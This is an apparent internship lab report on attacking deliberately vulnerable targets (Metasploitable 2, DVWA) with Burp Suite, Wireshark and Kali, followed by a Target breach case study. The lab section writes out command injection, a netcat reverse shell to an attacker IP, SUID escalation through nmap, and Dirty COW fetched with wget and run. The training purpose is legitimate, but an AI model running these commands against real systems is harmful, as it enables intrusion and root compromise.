
# **_SOC Analyst Internship Project Report_**

**Author**: *Sherif Rahim*  
**Presented to**: *CFSS Cyber Forensics Security Solutions*  
**Date**: *July 2024*

---

## **_Table of Contents_**
1. [Introduction and Overview](#introduction-and-overview)  
2. [Environment Setup](#environment-setup)  
3. [Using Burp Suite to Capture Login Page Requests](#using-burp-suite-to-capture-login-page-requests)  
4. [Using Wireshark to Capture Logs](#using-wireshark-to-capture-logs)  
5. [Using Burp Suite Tools: Intruder and Repeater](#using-burp-suite-tools-intruder-and-repeater)  
6. [Performing an Attack Using DVWA on Metasploitable 2](#performing-an-attack-using-dvwa-on-metasploitable-2)  
7. [Case Study of SOC Analyst Incident](#case-study-of-soc-analyst-incident)  
8. [Conclusions and Recommendations](#conclusions-and-recommendations)  
9. [References](#references)

---

## **_Introduction and Overview_**

This SOC Analyst internship project involves exploiting **Metasploitable 2** using **Burp Suite** and **Wireshark**. It demonstrates practical cybersecurity skills such as identifying vulnerabilities, capturing network traffic, and performing penetration testing in a controlled environment.

The highlights include:
- Practical use of tools: **Metasploitable 2**, **Burp Suite**, **Kali Linux**, **Wireshark**, **Nmap**
- Skills in critical thinking, vulnerability assessment, and network forensics.

---

## **_Environment Setup_**

### **Installing Metasploitable 2 in VirtualBox**
1. Download Metasploitable 2:  
   [Metasploitable 2 Download](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)
2. Download and Install VirtualBox:  
   [VirtualBox Download](https://www.virtualbox.org/)

### **Steps**:
- Create a new Virtual Machine and load the `.vmdk` file.
- Adjust memory (min 512MB) and network settings (e.g., NAT, Bridged).
- Boot and log in using credentials: `msfadmin / msfadmin`.
- Retrieve VM IP using `ifconfig`.

---

## **_Using Burp Suite to Capture Login Page Requests_**

### **Install and Configure Burp Suite**
- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)
- Set browser/system proxy to `127.0.0.1:8080`

### **Capture Login Request**
1. Open Burp Suite's Chromium browser.
2. Visit target login page (e.g., DVWA).
3. Submit random credentials.
4. Go to Burp Intercept > HTTP History.
5. **Extract credentials** from `POST` request.

**_Image Placeholder 1: Screenshot of Burp intercepting request_**  
**_Image Placeholder 2: HTTP History with credentials visible_**

---

## **_Using Wireshark to Capture Logs_**

### **Steps**:
1. Download: [Wireshark](https://www.wireshark.org/)
2. Select loopback network interface.
3. Apply filter:
   ```bash
   ip.addr == 127.0.0.1 && tcp.port == 8080
   ```
4. Attempt login on DVWA.
5. Pause capture.
6. Find `POST` packets > Right-click > Follow TCP stream to view credentials.

**_Image Placeholder: Wireshark stream with credentials_**

---

## **_Using Burp Suite Tools: Intruder and Repeater_**

### **Intruder Tool**
1. Capture `POST` login request to:  
   `http://testphp.vulnweb.com/login.php`
2. Send to Intruder.
3. Identify and set payload positions (username/password).
4. Choose attack type: `Clusterbomb`.
5. Enter payloads manually or import.
6. Start attack and monitor status codes (302 = fail, 200 = success).

**_Image Placeholder: Intruder Payload Settings_**

### **Repeater Tool**
1. Send captured request to Repeater.
2. Modify credentials manually.
3. Click **Send** and check response panel.
4. 200 + Welcome Page = **Successful Login**

**_Image Placeholder: Repeater successful login_**

---

## **_Performing an Attack Using DVWA on Metasploitable 2_**

### **Command Execution & Reverse Shell**
1. Access DVWA > Set Security to LOW.
2. Open **Command Execution** module.
3. Execute:
   ```
   <target-ip> && pwd
   ```
4. Set up reverse shell:
   - On Kali:  
     `nc -vv -lnp 1234`
   - On DVWA:  
     `nc -e /bin/sh <attacker-ip> 1234`

**_Image Placeholder: Terminal with reverse shell access_**

### **Privilege Escalation with SUID**
1. Find SUID binaries:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
2. Use `nmap --interactive`:
   ```bash
   !sh
   ```
3. Verify access using `whoami`.

### **Dirty COW Exploit (CVE-2016-5195)**
- Download: [Dirty COW - firefart](https://github.com/firefart/dirtycow)
- Compile:
   ```bash
   gcc -pthread dirty.c -o dirty -lcrypt
   ```
- Transfer to MS2 via Python server:
   ```bash
   python3 -m http.server
   ```
- On target:
   ```bash
   wget http://<kali-ip>:8000/dirty -O /tmp/dirty
   ./dirty
   ```

**_Image Placeholder: Root access using Dirty COW_**

---

## **_Case Study of SOC Analyst Incident_**

### **Target Data Breach (2013)**
- 40M records compromised via HVAC vendor credentials.
- Attackers installed POS malware.

### **Detection and Response**
- Flagged by SIEM due to anomalous activity.
- Incident Response involved system isolation, malware eradication.

### **Lessons Learned**
- Secure vendor access
- Network segmentation
- Continuous monitoring
- Incident response planning
- Employee awareness training

**Tools Used**:
- **SIEM**: Splunk, QRadar
- **EDR**: Carbon Black, CrowdStrike
- **Forensics**: FTK, Volatility

---

## **_Conclusions and Recommendations_**

### **Summary**
- Successfully demonstrated vulnerability discovery, exploitation, and post-exploit tactics.
- Learned to use real-world tools: Burp Suite, Wireshark, DVWA, Nmap.
- Understood SOC operations through the Target breach case study.

### **Recommendations**
- Explore advanced exploits
- Implement machine learning for anomaly detection
- Improve access control and continuous monitoring

---

## **_References_**

- https://portswigger.net/burp/documentation  
- https://www.wireshark.org/docs/  
- https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/  
- https://github.com/firefart/dirtycow  
- https://www.exploit-db.com/  
- https://stackoverflow.com/  
- https://reddit.com  

---

*This report forms the foundation for anyone pursuing a career in cybersecurity through real-world simulations and professional-grade tools.*
